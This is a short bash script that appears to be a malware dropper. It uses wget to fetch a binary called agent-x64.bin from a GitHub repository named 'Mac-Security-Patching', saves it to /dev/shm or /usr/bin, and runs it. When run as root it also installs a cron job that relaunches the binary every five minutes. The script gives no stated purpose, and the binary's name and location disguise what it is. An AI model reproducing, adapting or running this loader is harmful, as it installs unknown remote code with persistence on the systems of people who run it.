#!/bin/bash
PROGRAM="/dev/shm/agent"
ROOTPROGRAM="/usr/bin/agent"
SCHEDULE="*/5 * * * *"   # every 5 minutes
# Must be root
if [ "$EUID" -ne 0 ]; then
    echo "Downloading and executing $PROGRAM in the context of user: $USER"
    wget https://github.com/xxoo-d/Mac-Security-Patching/raw/refs/heads/main/agent-x64.bin -O $PROGRAM
    chmod +x $PROGRAM
    $PROGRAM &
else
    if command -v pgrep >/dev/null 2>&1; then
        echo "Using pgrep for process detection."
        CRON_CMD="pgrep -f '$ROOTPROGRAM' >/dev/null || $ROOTPROGRAM"
    else
        echo "Error: pgrep is not available."
        exit 1
    fi
    wget https://github.com/xxoo-d/Mac-Security-Patching/raw/refs/heads/main/agent-x64.bin -O $ROOTPROGRAM
    chmod +x $ROOTPROGRAM
    CRON_JOB="$SCHEDULE $CRON_CMD"
    (crontab -l 2>/dev/null | grep -v -F "$ROOTPROGRAM"; echo "$CRON_JOB") | crontab -
    echo "Cron job installed:"
    echo "$CRON_JOB"
    echo "Executing now..."
    $ROOTPROGRAM &
fi